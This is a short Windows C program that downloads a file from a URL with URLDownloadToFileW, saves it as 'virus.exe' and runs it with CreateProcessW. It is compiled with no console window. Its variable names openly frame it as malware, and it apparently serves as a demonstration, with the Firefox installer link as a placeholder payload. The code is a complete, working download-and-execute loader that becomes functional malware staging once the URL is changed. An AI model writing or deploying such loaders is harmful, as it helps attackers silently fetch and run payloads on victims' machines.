#include <Windows.h>
#include <urlmon.h>
#include <stdio.h>

#pragma comment(lib, "urlmon.lib")
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

// Uses URLDownloadToFileW to download and save a file from the internet
int downloadFile(WCHAR* downloadUrl, WCHAR* fileName) {
    printf("Downloading the file (%ws) from (%ws)...\n", fileName, downloadUrl);
    return URLDownloadToFileW(NULL, downloadUrl, fileName, 0, NULL);
}

int main(void) {
    // Initializing our variables
    WCHAR virusUrl[] = TEXT(L"https://download.mozilla.org/?product=firefox-latest-ssl&os=win&lang=en-US");
    WCHAR virusName[] = TEXT(L"virus.exe");
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Downloading the file
    downloadFile(virusUrl, virusName);

    // Creating new process and executing the file
    if (!CreateProcessW(virusName, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        printf("CreateProcess failed (%lu).\n", GetLastError());
        return 1;
    }
    else {
        // Wait until child process exits.
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    return 0;
}